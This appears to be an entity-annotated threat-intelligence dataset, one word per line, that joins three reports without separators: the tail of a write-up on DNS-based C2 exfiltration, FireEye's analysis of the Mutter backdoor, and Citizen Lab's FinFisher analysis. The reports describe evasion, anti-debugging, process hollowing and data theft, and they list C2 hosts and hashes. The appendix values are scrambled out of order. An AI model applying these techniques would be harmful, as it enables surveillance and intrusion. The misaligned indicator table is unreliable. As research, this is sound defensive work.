BAT
file
is
used
to
collect
important
information
from
the
system
,
including
the
currently
logged
on
user
,
the
hostname
,
network
configuration
data
,
user
and
group
accounts
,
local
and
domain
administrator
accounts
,
running
processes
,
and
other
data
.

Data
Exfiltration
over
DNS

Another
interesting
technique
leveraged
by
this
malware B_malware.infosteal
was
the
use
of
DNS
queries
as
a
data
exfiltration
channel
.
This
was
likely
done
because
DNS
is
required
for
normal
network
operations
.
The
DNS
protocol
is
unlikely
to
be
blocked
(
allowing
free
communications
out
of
the
network
)
and
its
use
is
unlikely
to
raise
suspicion
among
network
defenders
.

The
script
dns.ps1
,
dropped
by
the
macro B_malware.infosteal
,
is
used
for
this
purpose
.
In
the
following
section
,
we
describe
its
functionality
in
detail
.

1
.
The
script
requests
an
ID
(
through
the
DNS
protocol
)
from
go0gIe[.]com
.
This
ID
will
then
be
saved
into
the
PowerShell
script
.
2
.
Next
,
the
script
queries
the
C2
server
for
additional
instructions
.
If
no
further
actions
are
requested
,
the
script
exits
and
will
be
activated
again
the
next
time
update.vbs
is
called
.
3
.
If
an
action
is
required
,
the
DNS
server
replies
with
an
IP
with
the
pattern
33.33.xx.yy
.
The
script
then
proceeds
to
create
a
file
at
%PUBLIC%\Libraries\tp\chr(xx)chr(yy).bat
.
The
script
then
proceeds
to
make
DNS
requests
to
fetch
more
data
.
Each
DNS
request
results
in
the
C2
server
returning
an
IP
address
.
Each
octet
of
the
IP
address
is
interpreted
as
the
decimal
representation
of
an
ASCII
character;
for
example
,
the
decimal
number
99
is
equivalent
to
the
ASCII
character
'
c
'
.
The
characters
represented
by
the
octets
of
the
IP
address
are
appended
to
the
batch
file
to
construct
a
script
.
The
C2
server
signals
the
end
of
the
data
stream
by
replying
to
a
DNS
query
with
the
IP
address
35.35.35.35 B_ip.unknown
.
4
.
Once
the
file
has
been
successfully
transferred
,
the
BAT
file
will
be
run
and
its
output
saved
as
%PUBLIC%\Libraries\tp\chr(xx)chr(yy).txt
.
5
.
The
text
file
containing
the
results
of
the
BAT
script
will
then
be
uploaded
to
the
DNS
server
by
embedding
file
data
into
part
of
the
subdomain
.

The
format
of
the
DNS
query
used
is
shown
in
Table
1
.
6
.
The
BAT
file
and
the
text
file
will
then
be
deleted
.

The
script
then
quits
,
to
be
invoked
again
upon
running
the
next
scheduled
task
.

The
DNS
communication
portion
of
the
script
is
shown
in
Figure
8
,
along
with
a
table
showing
the
various
subdomain
formats
being
generated
by
the
script
.

Figure
8
:
Code
Snippet
of
dns.ps1

Format
of
subdomains
used
in
DNS
C2
protocol
:
[00][botid]00000[base36
random
number]30
[00]
[botid]00000[base36
random
number]232A[hex_filename]
[i-counter]
[00][botid][cmdid][partid][base36
random
number][48hex-char-of-file-content]

Subdomain
used
to
request
for

BotID
,
used
in
step
2
above

Subdomain
used
while
performing
file
transfers
used
in
step
3
above

Subdomain
used
while
performing
file
upload
,
used
in
step
5
above

Table
1
:
C2
Protocol
Format

Conclusion

Although
this
attack
did
not
leverage
any
zero-days
or
other
advanced
techniques
,
it
was
interesting
to
see
how
attackers
used
different
components
to
perform
reconnaissance
activities
on
a
specific
target
.

This
attack
also
demonstrates
that
macro B_malware.infosteal
malware I
is
effective
even
today
.
Users
can
protect
themselves
from
such
attacks
by
disabling
Office
macros
in
their
settings
and
also
by
being
more
vigilant
when
enabling
macros
(
especially
when
prompted
)
in
documents
,
even
if
such
documents
are
from
seemingly
trusted
sources
.
THE
MUTTER  B_malware.backdoor
BACKDOOR  I
:
OPERATION
BEEBUS
WITH
NEW
TARGETS

FireEye
Labs
has
observed
a
series
of
related
attacks
against
a
dozen
organizations
in
the
aerospace
,
defense
,
and
telecommunications
industries
as
well
as
government
agencies
located
in
the
United
States
and
India
which
have
been
occurring
at
least
as
early
as
December
of
2011
.
In
at
least
one
case
,
a
decoy
document
included
in
the
attack
contained
content
that
focused
on
Pakistan
military
advancements
in
unmanned
vehicle
,
or
'
drone
'
technology
.
Technically
,
these
attacks
exploited
previously
discovered
vulnerabilities
via
document
files
delivered
by
email
in
order
to
plant
a
previously
unknown
backdoor
onto
victim
systems
.
The
malware
used
in
these
attacks
employs
a
number
of
interesting
techniques
to
'
hide
in
plain
sight
'
and
to
evade
dynamic
malware
analysis
systems
.
Similar
to
,
though
not
based
on
the
attacks
we
saw
in
South
Korea
,
the
malware
tries
to
stay
inactive
as
long
as
possible
to
evade
dynamic
analysis
detection
methods
.

We
have
linked
these
attacks
back
to
Operation
Beebus
through
the
C&C
infrastructure
along
with
the
similar
targets
and
timeline
observed
.
Although
some
of
the
targets
of
these
attacks
overlapped
with
Beebus
targets
,
there
were
many
new
targets
discovered
including
some
in
India
.
As
we
uncover
more
targets
related
to
these
attacks
,
we
are
seeing
a
common
link
between
them
:
unmanned
vehicles
,
also
known
as
'
drones
'
.
The
set
of
targets
cover
all
aspects
of
unmanned
vehicles
,
land
,
air
,
and
sea
,
from
research
to
design
to
manufacturing
of
the
vehicles
and
their
various
subsystems
.
Other
related
malware
have
been
discovered
through
the
same
C&C
infrastructure
that
have
a
similar
set
of
targets
,
that
when
included
bring
the
total
number
of
targets
to
more
than
20
as
of
this
writing
.
These
targets
include
some
in
academia
which
have
received
military
funding
for
their
research
projects
relating
to
unmanned
vehicles
.

INFILTRATION

All
of
the
attacks
we
have
observed
occurred
through
document
exploits
attacking
known
vulnerabilities
.
We
have
seen
RTF
and
XLS
files
used
for
delivery
.
Searching
the
internet
for
the
author
and
document
names
yields
information
regarding
South
Asia
politics
.
Although
all
of
the
document
exploits
we
have
analyzed
drop
a
decoy
document
,
most
of
them
are
either
empty
or
filled
with
unreadable
data
with
two
exceptions
.

One
is
an
article
about
Pakistan's
indigenous
UAV
industry
which
is
attributed
to
author
Aditi
Malhotra
,
an
Indian
writer
and
Associate
Fellow
at
the
Centre
for
Land
Warfare
Studies
(
CLAWS
)
in
New
Delhi
.
Although
we
are
not
sure
this
particular
work
is
actually
hers
,
we
did
find
a
reference
to
a
similarly
named
article
'
Pakistan's
UAV
programme
:

Ambitious
,
with
some
friendly
help
.
'
Unfortunately
,
this
document
was
not
available
.
Other
works
of
hers
on
a
similar
note
include
'
India's
Silence
on
Chinese
Incursions
'
and
'
China
and
Pakistan
:
Dangerous
Liaisons
.
'

The
other
decoy
document
is
contact
info
for
an
American
with
a
military
provided
email
address
from
Joint
Base

Andrews
in
Maryland
,
but
with
a
physical
address
in
Pakistan
titled
'
Family
Planning
Association
of
Base
(
FPAB
)
.
'
It
looks
like
they
took
the
'
Family
Planning
Association
of
Bangladesh
'
and
combined
it
with
'
Joint
Base
Andrews
.
'
The
title
of
the
email
field
is
'
FPAP
Email
'
,
'
FPAP
'
could
stand
for
'
Family
Planning
Association
of
Pakistan
.
'
Ultimately
,
we
could
make
no
sense
from
this
information
.

THE
MUTTER  B_malware.backdoor
BACKDOOR  I

Two
different
versions
of
the
same
backdoor
were
used
in
all
of
these
attacks
.
In
every
case
we
have
found
,
the
main
component
is
a
DLL
dropped
by
an
executable
compiled
minutes
after
the
DLL
.
The
dropper
shares
the
same
decoding
functions
as
the
DLL
and
performs
some
modifications
on
the
DLL
that
will
be
described
later
.
There
was
one
unique
case
we
found
where
the
initial
dropper
was
a
self­extracting
archive
that
utilizes
Visual
Basic
and
batch
scripts
to
download
and
install
the
DLL
instead
of
extracting
it
from
a
resource
.

Mutter  B_malware.backdoor
is
HTTP
proxy
aware
,
and
attempts
to
determine
if
a
proxy
is
required
and
what
the
proxy
details
are
if
necessary
.
It
uses
google.co.in  B_url.normal
to
perform
such
tests
.
It
uses
HTTP
to
communicate
with
the
C&C
server
and
expects
an
encoded
string
between
a
pair
of
<p>
tags
in
the
response
.
The
URL
in
the
request
has
one
parameter
,
'
i
'
,
which
is
set
to
an
encoded
representation
of
a
string
that
follows
this
format
:
<Mutter
version#>­<campaign
marker?>­<victim
hostname>­<victim
IP
address>

We
are
not
certain
about
the
second
part
of
this
string
,
it
may
be
either
a
campaign
marker
or
an
extension
of
the
version
number
.
In
all
our
cases
,
it
is
set
to
either
'
SN0
'
or
'
SN1
.
'
Actual
strings
are
shared
in
the
appendix
information
at
the
end
of
this
blog
.

This
HTTP
request
pictured
in
the
screenshot
is
from
the
older
version
of
Mutter  B_malware.backdoor
.

The
newer
versions
of
Mutter  B_malware.backdoor
have
a
very
similar
HTTP
request
,
but
with
the
Host
and
Connection
headers
swapped
.

The
response
string
is
decoded
and
parsed
for
the
following
commands
:
'
m
'
:
executes
a
shell
command
'
u
'
:
uploads
a
file
to
the
victim
(
downloads
a
file
from
the
victim's
perspective
)
'
d
'
:
downloads
a
file
to
the
attacker
(
uploads
a
file
from
the
victim's
perspective
)
'
R
'
:
removes
the
auto­run
registry
value

These
commands
are
referenced
in
the
code
in
this
order
,
and
when
said
aloud
it
sounds
like
'
mutter  B_malware.backdoor
'
,
hence
the
name
chosen
for
the
malware
.
In
the
earlier
version
of
this
backdoor
,
the
'
d
'
command
was
referenced
,
but
the
code
had
not
been
implemented
yet
.
In
both
versions
,
another
command
string
'
f
'
appears
along
with
the
others
,
but
is
not
referenced
in
the
code
.
This
perhaps
indicates
a
future
feature
to
be
added
.

This
malware  B_malware.backdoor
employs
several
interesting
evasion
techniques
.

For
starters
,
it
employs
several
'
hide
in
plain
sight
'
techniques
common
to
malware
used
in
targeted
attacks
.
It
specifies
fake
properties
,
pretending
to
be
Google
or
Microsoft
.

This
brings
us
to
the
next
'
hide
in
plain
sight
'
tactic
we
noticed
.
Observe
the
size
of
the
file
above
.
It's
a
whopping
41
megabytes
.
With
rare
exception
,
malware
typically
have
a
small
size
usually
no
larger
than
a
few
hundred
kilobytes
.

When
an
investigator
comes
across
a
file
megabytes
in
size
,
he
may
be
discouraged
from
taking
a
closer
look
.

Interestingly
,
the
original
size
of
this
particular
DLL
is
around
160
kilobytes
,
although
the
PE
headers
already
indicate
its
future
size
as
shown
below
.
The
dropper
will
decode
this
DLL
from
its
resource
section
,
drop
it
onto
the
victim's
system
,
and
proceed
to
fill
its
resource
section
with
randomly
generated
data
.
This
has
another
useful
side
effect
of
giving
each
DLL
a
unique
hash
,
making
it
more
difficult
to
identify
.

In
addition
to
these
hiding
techniques
,
this
malware
also
appears
to
employ
techniques
to
possibly
evade
dynamic
malware
analysis
systems
.
This
has
been
an
ongoing
trend
in
malware
development
that
we
and
others
have
observed
several
times
in
past
.
The
malware
author
will
add
code
to
delay
the
execution
of
the
important
functionality
for
some
period
of
time
with
the
idea
being
that
if
the
malware
stalls
for
long
enough
,
the
dynamic
malware
analysis
system
will
give
up
on
it
and
pass
it
off
as
benign
.
This
malware
has
two
routines
that
we
could
find
no
other
purpose
than
for
such
an
evasion
.

One
routine
is
a
function
that
simply
runs
a
series
of
loops
,
incrementing
a
local
variable
over
and
over
,
thousands
of
times
.
It
ultimately
disregards
the
final
value
of
this
variable
,
meaning
that
the
function
serves
no
purpose
.
This
function
is
called
many
times
throughout
the
rest
of
the
code
.
It
may
have
been
implemented
for
the
purpose
of
wasting
time
.

Another
routine
seems
to
have
a
similar
goal
,
but
with
a
different
approach
.
This
time
,
a
loop
is
implemented
with
a
call
to
sleep
for
a
short
time
.
This
loop
occurs
many
times
,
and
each
time
it
will
also
allocate
a
chunk
of
memory
on
the
heap
,
performing
math
operations
on
it
and
printing
it
to
the
console
over
and
over
again
.
Keep
in
mind
that
this
memory
is
not
initialized
to
any
value
and
is
not
used
for
anything
later
in
the
code
,
it
is
essentially
junk
memory
.
This
seems
to
be
another
means
of
wasting
time
.

We
detect
this
malware
as
Backdoor.APT.NS01
.

C&C
DETAILS

Most
of
the
domains
registered
for
C&C
use
in
this
campaign
were
done
so
through
the
free
dynamic
DNS
Provider

ChangeIP.com  B_url.normal
.
Dynamic
DNS
is
a
popular
option
for
domain
registration
since
it
is
free
and
provides
a
convenient
level
of
anonymity
.
Looking
at
passive
DNS
records
for
other
domains
pointing
to
the
IP
addresses
used
to
host
the

C&C
services
turned
up
many
other
related
domains
.
Various
subdomains
of
the
domain
winsupdate.com  B_url.unknown
have
pointed
to
several
IPs
pointed
to
by
the
Mutter  B_malware.backdoor
domains
.

This
is
interesting
because
this
is
the
name
of
the
folder
created
by
Mutter  B_malware.backdoor
on
victims
'
systems
.

Furthermore
,
this
domain
is
not
a
publicly
available
dynamic
DNS
provider
and
the
email
address
used
to
register
this
domain
is
binalakshminp@yahoo.com
.
We
cannot
be
certain
,
but
this
name
could
be
in
reference
to
Binalakshmi
Nepram
,
a
writer­activist
born
in
Manipur
India
who
is
fighting
for
disarmament
.
This
fits
the
theme
we
have
observed
from
other
clues
left
behind
in
decoy
documents
.
Another
domain
that
is
indirectly
linked
is
agfire.com
with
this
interesting
registration
information
.

Agni
is
the
Hindu
god
of
fire
.
Notice
the
combination
of
India
and
China
references
here
.
The
email
address
used
to
register
this
domain
was
also
referenced
in
a
Chinese
developer
forum
,
but
nothing
else
interesting
was
discovered
about
it
.

The
IP
addresses
hosting
the
C&C
services
are
scattered
all
over
the
world
and
are
believed
to
be
compromised
hosts
.

ATTACKERS
,
TARGETS
,
AND
TIMELINE

The
attackers
appear
to
be
the
well
known
and
prolific
'
Comment
Group
'
as
we
had
stated
in
our
previous
blog
on

Operation
Beebus
.
This
link
was
made
through
finding
several
overlapping
IP
addresses
used
by
Mutter  B_malware.backdoor
and
Beebus  B_malware.backdoor
such
as
the
following
.

The
theme
of
these
attacks
appears
to
be
South
Asia
politics
.
The
hints
scattered
throughout
the
documents
and
domain
registrant
information
were
laid
on
pretty
thick
which
is
something
be
wary
of
.
The
only
legible
,
sensible
decoy
document
observed
so
far
is
revealing
of
the
interests
of
at
least
one
of
the
targets
of
this
campaign
:
namely
the
military
threat
of
Pakistan
against
India
and
its
growing
relationships
with
other
countries
including
China
.
The
particular
topic
of
this
decoy
document
also
appears
to
be
a
common
link
between
most
of
the
targets
we
have
seen
:
unmanned
vehicles
.

The
timeline
below
outlines
the
events
specific
to
Mutter  B_malware.backdoor
that
we
had
visibility
into
.

This
campaign
is
still
ongoing
with

Mutter  B_malware.backdoor
callbacks
being
made
to
this
day
.

APPENDIX

Documents

Exploit
Document
MD5
:
b5f4a9aac67b53762ed98fafd067c803  B_hash

Exploit
:

CVE­2012­0158

Exploit
Document
Filename
:

Decoy
Document
Title
:

Pakistan's
Indigenous
UAV
industry

Decoy
Document
Author
:

GOPAL
GURUNG

Decoy
Document
Last
Modified
:

Aug
2nd
2010

First
Seen
:

Aug
27th
2012

Exploit
Document
MD5
:
92643bfa4121f1960c43c78a3d53568b  B_hash

Exploit
:

CVE­2008­3005

Exploit
Document
Filename
:
2012_3_12.xls

Decoy
Document
Title
:
Decoy
Document
Author
:

Decoy
Document
Last
Modified
:

Jan
26th
2003

First
Seen
:

Mar
22nd
2012

Exploit
Document
MD5
:
4d5a235048e94579aab0062057296186  B_hash

Exploit
:

CVE­2010­3333

Exploit
Document
Filename
:

Change
of
Address.doc

Decoy
Document
Title
:

Tele
:
2619
4428

Decoy
Document
Author
:
kdly

Decoy
Document
Last
Modified
:

Dec
6th
2011

First
Seen
:

Dec
7th
2011

Exploit
Document
MD5
:
589f10e2efdd98bfbdc34f247b6a347f  B_hash

Exploit
:

CVE­2010­3333

Exploit
Document
Filename
:

Urgent
message.doc

Decoy
Document
Title
:

Decoy
Document
Author
:

Administrator

Decoy
Document
Last
Modified
:

Feb
2nd
2003

First
Seen
:

Mar
2nd
2012

Exploit
Document
MD5
:
fd9777c90abb4b758b4aff29cfd68b98  B_hash

Exploit
:

CVE­2012­0158

Exploit
Document
Filename
:

Decoy
Document
Title
:

Tariq
Masud

Decoy
Document
Author
:

Haroon­ur­Rashid/Administrator

Decoy
Document
Last
Modified
:

Sept
11
2012

First
Seen
:

Malware

Dropper
Filename
:
update.exe

Dropper
MD5
:

DLL
Filename
:

Mutex
:

C&C
Host
:
725fc0d7a8e7b9e01a83111619744b6f  B_hash
msdsp.dll
654234576804d
cdind.antivirup.com:8081 B_url.cncsvr

Decoded
'
i
'
Value
:

Compile
Time
:

Dropper
Filename
:

Dropper
MD5
:

DLL
Filename
:

Mutex
:

C&C
Host
:

Decoded
'
i
'
Value
:

Compile
Time
:

Dropper
Filename
:

Dropper
MD5
:

DLL
Filename
:

Mutex
:

C&C
Host
:

Decoded
'
i
'
Value
:

Compile
Time
:

Dropper
Filename
:

Dropper
MD5
:

DLL
Filename
:

Mutex
:

C&C
Host
:

Decoded
'
i
'
Value
:

Compile
Time
:

Dropper
Filename
:

Dropper
MD5
:

DLL
Filename
:

Mutex
:

C&C
Host
:

Decoded
'
i
'
Value
:

Compile
Time
:

Dropper
Filename
:

V0.9.6Y­SN1­<hostname>­<IP
address>

Aug
28th
2012
igfxtray.exe
681a014e9d221c1003c54a2a9a1d9df8  B_hash
winsups.dll
mqe45tex13fw14op0
http.4pu.com:80 B_url.cncsvr

V0.7­SN0­<hostname>h;­<IP
address>

Aug
28th
2012
6aac76fc8309e29ea8a7afea48ae9b29  B_hash
msdsp.dll
654234576804d
oracledata.ns01.us:80 B_url.cncsvr

V0.9.6X­SN1­<hostname>­<IP
address>

Aug
12th
2012
ctfmon.exe
d5640ae049779bbb068eff08616adb95  B_hash
winsups.dll
mqe45tex13fw14op0
mydns.dns2.us:443 B_url.cncsvr

V0.7­SN0­<hostname>­<IP
address>

Aug
2nd
2010
igfxtray.exe
681a014e9d221c1003c54a2a9a1d9df8  B_hash
winsups.dll
mqe45tex13fw14op0
http.4pu.com:80 b_url.cncsvr

V0.7­SN0­<hostname>­<IP
address>

Aug
2nd
2010
igfxpers.exe

Dropper
MD5
:

DLL
Filename
:

Mutex
:

C&C
Host
:

Decoded
'
i
'
Value
:

Compile
Time
:
06d5dddd4c349f666d84a91d6edc4f8d  B_hash
msdsp.dll

Thanks
to
Darien
Kindlund
for
his
assistance
in
research
.

This
entry
was
posted
on
Wed
Apr
17
15:49:57
EDT
2013
and
filed
under
Advanced
Malware
,
Blog
,
James
T
.
Bennett
,
Targeted
Attack
and
Threat
Research
.
﻿The
Citizen
Lab

INTRODUCTION

Research
Brief

July
2012

From
Bahrain
with
Love
:

FinFisher's B_malware.infosteal
Spy I
Kit I
Exposed
?

Author
:
Morgan
Marquis-Boire

The
FinFisher B_malware.infosteal
Suite I
is
described
by
its
distributors
,
Gamma
International
UK
Ltd
.
,
as
'
Governmental
IT
Intrusion
and
Remote
Monitoring
Solutions
.
'

1
The
toolset B_malware.infosteal
first
gained
notoriety
after
it
was
revealed
that
the
Egyptian
Government's
state
security
apparatus
had
been
involved
in
negotiations
with
Gamma
International
UK
Ltd
.

over
the
purchase
of
the
software
.
Promotional
materials
have
been
leaked
that
describe
the
tools
as
providing
a
wide
range
of
intrusion
and
monitoring
capabilities.2
Despite
this
,
however
,
the
toolset
itself
has
not
been
publicly
analyzed
.

This
post
contains
analysis
of
several
pieces
of
malware
obtained
by
Vernon
Silver
of
Bloomberg
News
that
were
sent
to
Bahraini
pro-democracy
activists
in
April
and
May
of
this
year
.

The
purpose
of
this
work
is
identification
and
classification
of
the
malware
to
better
understand
the
actors
behind
the
attacks
and
the
risk
to
victims
.

In
order
to
accomplish
this
,
we
undertook
several
different
approaches
during
the
investigation
.

As
well
as
directly
examining
the
samples
through
static
and
dynamic
analysis
,
we
infected
a
virtual
machine
(
VM
)
with
the
malware
.

We
monitored
the
filesystem
,
network
,
and
running
operating
system
of
the
infected
VM
.

This
analysis
suggests
the
use
of
'
Finspy B_malware.infosteal
'
,
part
of
the
commercial
intrusion
kit
,
Finfisher B_malware.infosteal
,
distributed
by
Gamma
International
.

DELIVERY

This
section
describes
how
the
malware
was
delivered
to
potential
victims
using
e-mails
with
malicious
attachments
.

In
early
May
,
we
were
alerted
that
Bahraini
activists
were
targeted
with
apparently
malicious
e-mails
.

The
emails
ostensibly
pertained
to
the
ongoing
turmoil
in
Bahrain
,
and
encouraged
recipients
to
open
a
series
of
suspicious
attachments
.

The
screenshot
below
is
indicative
of
typical
message
content
:

July
2012

The
attachments
to
the
e-mails
we
have
been
able
to
analyze
were
typically
.rar
files
,
which
we
found
to
contain
malware
.

Note
that
the
apparent
sender
has
an
e-mail
address
that
indicates
that
it
was
being
sent
by
'
Melissa
Chan
,
'
who
is
a
real
correspondent
for
Aljazeera
English
.

We
suspect
that
the
e-mail
address
is
not
her
real
address
.
3

The
following
samples
were
examined
:

324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc.rar
الفعاليات
c5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914
_gpj.ArrestedXSuspects.rar
c5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7
KingXhamadXonXofficialXvisitXtoX.rar
80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc
MeetingXAgenda.rar
f846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751
Rajab.rar

These
contained
executables
masquerading
as
picture
files
or
documents
:

49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040
dialoge.exe B_malware.infosteal
cc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c
gpj.1bajaR.exe B_malware.infosteal
39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba
gpj.1egami.exe B_malware.infosteal
e48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632
gpj.bajaR.exe B_malware.infosteal
2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14
gpj.stcepsuS
detserrA.exe B_malware.infosteal
c29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864
News
about
the
existence
of
a
new
dialogue
between
AlWefaq
&
Govt..doc

July
2012

The
emails
generally
suggested
that
the
attachments
contained
political
content
of
interest
to
pro-democracy
activists
and
dissidents
.

In
order
to
disguise
the
nature
of
the
attachments
a
malicious
usage
of
the
'
righttoleftoverride
'
(
RLO
)
character
was
employed
.

The
RLO
character
(
U+202e
in
unicode
)
controls
the
positioning
of
characters
in
text
containing
characters
flowing
from
right
to
left
,
such
as
Arabic
or
Hebrew
.

The
malware
appears
on
a
victim's
desktop
as
'
exe.Rajab1.jpg B_malware.infosteal
'
(
for
example
)
,
along
with
the
default
Windows
icon
for
a
picture
file
without
thumbnail
.

But
,
when
the
UTF-8
based
filename
is
displayed
in
ANSI
,
the
name
is
displayed
as
'
gpj.1bajaR.exe B_malware.infosteal
'
.

Believing
that
they
are
opening
a
harmless
'
.jpg
'
,
victims
are
instead
tricked
into
running
an
executable
'
.exe
'
file
.
4

Upon
execution
these
files
install
a
multi-featured
trojan B_malware.backdoor
on
the
victim's
computer
.

This
malware
provides
the
attacker
with
clandestine
remote
access
to
the
victim's
machine
as
well
as
comprehensive
data
harvesting
and
exfiltration
capabilities
.

INSTALLATION

This
section
describes
how
the
malware
infects
the
target
machine
.

The
malware
displays
a
picture
as
expected
.

This
differs
from
sample
to
sample
.

The
sample
'
Arrested
Suspects.jpg
'
(
'
gpj.stcepsuS
detserrA.exe
'
)
displays
:

July
2012

It
additionally
creates
a
directory
(
which
appears
to
vary
from
sample
to
sample
)
:

C:\DocumentsandSettings\XPMUser\LocalSettings\Temp\TMP51B7AFEF

It
copies
itself
there
(
in
this
case
the
malware
appears
as
'
Arrested
Suspects.jpg
'
)
where
it
is
renamed
:

C:\DocumentsandSettings\XPMUser\LocalSettings\Temp\TMP51B7AFEF\ArrestedSuspects.jpg
'
=>

C:\DocumentsandSettings\XPMUser\LocalSettings\Temp\TMP51B7AFEF\tmpD.tmp

Then
it
drops
the
following
files
:

C:\DOCUME~1\%USER%\LOCALS~1\Temp\delete.bat

C:\DOCUME~1\%USER%\LOCALS~1\Temp\driverw.sys

It
creates
the
folder
(
the
name
of
which
varies
from
host
to
host
)
:

C:\DocumentsandSettings\%USER%\ApplicationData\Microsoft\Installer\{5DA45CC9-D840-47CC9F86-FD2E9A718A41}

This
process
is
observable
on
the
filesystem
timeline
of
the
infected
host
(
click
image
to
enlarge
)
:

'
driverw.sys
'
is
loaded
and
then
'
delete.bat
'
is
run
which
deletes
the
original
payload
and
itself
.

It
then
infects
existing
operating
system
processes
,
connects
to
the
command
and
control
server
,
and
begins
data
harvesting
and
exfiltration
.

Examining
the
memory
image
of
a
machine
infected
with
the
malware
shows
that
a
technique
for
infecting
processes
known
as
'
process B_malware.unknown
hollowing I
'
is
used
.

For
example
,
the
memory
segment
below
from
the
'
winlogon.exe
'
process
is
marked
as
executable
and
writeable
:

July
2012

Here
the
malware
starts
a
new
instance
of
a
legitimate
process
such
as
'
winlogon.exe
'
and
before
the
process's
first
thread
begins
,
the
malware
de-allocates
the
memory
containing
the
legitimate
code
and
injects
malicious
code
in
its
place
.

Dumping
and
examining
this
memory
segment
reveals
the
following
strings
in
the
infected
process
:

Note
the
string
:

y:\lsvn_branches\finspyv4.01\finspyv2\src\libs\libgmp\mpn-tdiv_qr.c

This
file
seems
to
correspond
to
a
file
in
the
GNU
Multi-Precision
arithmetic
library
:
http://gmplib.org:8000/gmp/file/b5ca16212198/mpn/generic/tdiv_qr.c B_url.normal

The
process
'
svchost.exe
'
was
also
found
to
be
infected
in
a
similar
manner
:

July
2012

Further
examination
of
the
memory
dump
also
reveals
the
following
:

July
2012

This
path
appears
to
reference
the
functionality
that
the
malware
uses
to
modify
the
boot
sequence
to
enable
persistence
:

y:\lsvn_branches\finspyv4.01\finspyv2\src\target\bootkit_x32driver\objfre_w2k_x86\i386\bootkit_x32driver.pdb

A
pre-infection
vs
post-infection
comparison
of
the
infected
VM
shows
that
the
Master
Boot
Record
(
MBR
)
was
modified
by
code
injected
by
the
malware
.

The
strings
found
in
memory
'
finspyv4.01 B_malware.infosteal
'
and
'
finspyv2 B_malware.infosteal
'
are
particularly
interesting
.
The
FinSpy B_malware.infosteal
tool I
is
part
of
the
FinFisher B_malware.infosteal
intrusion
and
monitoring
toolkit
.
5

OBFUSCATION
AND
EVASION

This
section
describes
how
the
malware
is
designed
to
resist
analysis
and
evade
identification
.

The
malware
employs
a
myriad
of
techniques
designed
to
evade
detection
and
frustrate
analysis
.

While
investigation
into
this
area
is
far
from
complete
,
we
discuss
several
discovered
methods
as
examples
of
the
lengths
taken
by
the
developers
to
avoid
identification
.

A
virtualised
packer
is
used
.

This
type
of
obfuscation
is
used
by
those
that
have
'
strong
motives
to
prevent
their
malware
from
being
analyzed
'
.
6

This
converts
the
native
x86
instructions
of
the
malware
into
another
custom
language
chosen
from
one
of
11
code
templates
.
At
run-time
,
this
is
interpreted
by
an
obfuscated
interpreter
customized
for
that
particular
language
.

This
virtualised
packer
was
not
recognised
and
appears
to
be
bespoke
.

Several
anti-debugging
techniques
are
used
.

This
section
of
code
crashes
the
popular
debugger
,
OllyDbg
.

July
2012

.text:00401683
finit
.text:00401686
fld
ds:tbyte_40168E
.text:0040168C
jmp
short
locret_401698
--------------------------------------------------------------------
.text:0040168E
tbyte_40168E
dt
9.2233720368547758075e18
--------------------------------------------------------------------
.text:00401698
locret_401698
:
.text:00401698
retn

This
float
value
causes
OllyDbg
to
crash
when
trying
to
display
its
value
.

A
more
detailed
explanation
of
this
can
be
found
here
.

To
defeat
DbgBreakPoint
based
debuggers
,
the
malware
finds
the
address
of
DbgBreakPoint
,
makes
the
page
EXECUTE_READWRITE
and
writes
a
NOP
on
the
entry
point
of
DbgBreakPoint
.

The
malware
checks
via
PEB
to
detect
whether
or
not
it
is
being
debugged
,
and
if
it
is
it
returns
a
random
address
.

The
malware
calls
ZwSetInformationThread
with
ThreadInformationClass
set
to
0x11
,
which
causes
the
thread
to
be
detached
from
the
debugger
.

The
malware
calls
ZwQueryInformationProcess
with
ThreadInformationClass
set
to
0x(ProcessDebugPort
)
and
0x1e
(
ProcessDebugObjectHandle
)
to
detect
the
presence
of
a
debugger
.

If
a
debugger
is
detected
it
jumps
to
a
random
address
.

ZwQueryInformationProcess
is
also
called
to
check
the
DEP
status
on
the
current
process
,
and
it
disables
it
if
it's
found
to
be
enabled
.

The
malware
deploys
a
granular
solution
for
Antivirus
software
,
tailored
to
the
AV
present
on
the
infected
machine
.

The
malware
calls
ZwQuerySystemInformation
to
get
ProcessInformation
and
ModuleInformation
.

The
malware
then
walks
the
list
of
processes
and
modules
looking
for
installed
AV
software
.

Our
analysis
indicates
that
the
malware
appears
to
have
different
code
to
Open/Create
process
and
inject
for
each
AV
solution
.

For
some
Anti-Virus
software
this
even
appears
to
be
version
dependent
.

The
function
'
ZwQuerySystemInformation
'
is
also
hooked
by
the
malware
,
a
technique
frequently
used
to
allow
process
hiding
:

July
2012

DATA
HARVESTING
AND
ENCRYPTION

This
section
describes
how
the
malware
collects
and
encrypts
data
from
the
infected
machine
.

July
2012

Our
analysis
showed
that
the
malware
collects
a
wide
range
of
data
from
an
infected
victim
.

The
data
is
stored
locally
in
a
hidden
directory
,
and
is
disguised
with
encryption
prior
to
exfiltration
.
'
C:\Windows\Installer\{49FD463C-18F1-63C4-8F12-49F518F127}
.
'

On
the
reference
victim
host
,
the
directory
was
:

We
conducted
forensic
examination
of
the
files
created
in
this
directory
and
identified
a
wide
range
of
data
collected
.
Files
in
this
directory
were
found
to
be
screenshots
,
keylogger
data
,
audio
from
Skype
calls
,
passwords
and
more
.
For
the
sake
of
brevity
we
include
a
limited
set
of
examples
here
.

The
malware
attempts
to
locate
the
configuration
and
password
store
files
for
a
variety
browsers
and
chat
clients
as
seen
below
:

July
2012

We
observed
the
creation
of
the
file
'
t111o00000000.dat
'
in
the
data
harvesting
directory
,
as
shown
in
the
filesystem
timeline
below
:

Thu
Jun
14
2012
12:31:34
52719
mac
.
r/rr-xr-xr-x
0
0
26395-128-5
